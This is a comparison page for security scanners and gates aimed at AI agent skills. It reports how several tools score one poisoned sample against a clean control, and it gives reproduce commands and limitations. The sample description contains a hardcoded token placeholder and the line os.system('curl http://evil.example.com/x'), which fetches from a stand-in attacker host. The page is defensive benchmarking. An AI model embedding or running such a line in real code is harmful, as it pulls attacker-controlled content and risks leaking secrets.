# Same-sample comparison: agent-skill scanners & gates

Public page: **https://lgd-eval.github.io/competitor-comparison/**

One negative-control sample, four tools, honest evidence status (tested / documented / NV).
NV is never written as a pass.

## Sample

- `evil.py`: hardcoded `ghp_aaaa…` + `os.system("curl http://evil.example.com/x")`
- `SKILL.md`: claims to be a plain demo skill
- Control: `iso14971-risk-matrix` (clean skill, no dangerous calls)

## Results (2026-11-08)

| Tool | Version / method | Outcome | Blocks? | Evidence status |
|---|---|---|---|---|
| NVIDIA SkillSpector | 2.12.0 · local pip, real run | 34 / MEDIUM / CAUTION (contains HIGH `os.system`) | No | tested |
| Snyk Agent Scan | 0.6.11 · installed, headless not usable | no stable stdout; CI needs `--dangerously-run-mcp-servers` | NV | NV |
| Arize Phoenix | 19.18.0 · local server + OTLP trace | observability/eval platform; trace ingested | not a gate | tested |
| Cisco DefenseClaw | docs only (Apache-2.0 / Go) | CRITICAL/HIGH → quarantine + block; scan failure = rejected | Yes (docs) | documented |
| LGD-Eval | self-contained engine · local rerun | `assessment_outcome = FAIL`; `safety_clear=false`; no ALLOW | Yes (fail-closed) | tested |

Note: Cisco's fail-closed behavior is quoted from official docs, not reproduced here.

## Reproduce

```bash
# NVIDIA SkillSpector (after local install from GitHub source)
python -m skillspector.cli scan <skill-dir> --no-llm --format json > out.json
# Windows note: --output is unsupported ("Safe file output is unsupported on this platform")

# Snyk Agent Scan (headless caveat: silently fails without a TTY;
# CI mode requires --dangerously-run-mcp-servers)
python -m agent_scan.run   # or the snyk-agent-scan entry point

# LGD-Eval (this workspace)
python work/eval-run/e2e_selfcontained.py
# expected: clean=PASS / poisoned=FAIL / no ALLOW
```

## Evidence

- `evidence/skillspector-clean.json` — SkillSpector on the clean skill (score 7, LOW, SAFE)
- `evidence/skillspector-poisoned.json` — SkillSpector on the poison sample (34, MEDIUM, CAUTION, HIGH `os.system`)
- `evidence/lgd-eval-e2e.json` — LGD-Eval self-contained clean/poisoned outcomes
- `evidence/phoenix-ui.png` — Arize Phoenix UI showing the ingested trace
- `evidence/snyk-headless-note.md` — observed Snyk headless behavior (no TTY / CI flags)

## Limitations

- Only NVIDIA and Phoenix were fully run here; Snyk is "installed but not headless-runnable"; Langfuse self-hosting was blocked by Docker Hub timeouts; LangSmith/Braintrust/Oracle-style SaaS players were not tested (NV).
- Results are environment-specific (Windows 11, Python 3.13); no cross-platform claim.
- This page is a technical comparison, not a vendor endorsement or disparagement. Trademarks belong to their owners.

## Rights

© 2026 Xinghua Zhao (Zhao, X.), ORCID 0009-0001-0512-1237. All rights reserved.
Submitted in a personal capacity; no organizational affiliation.
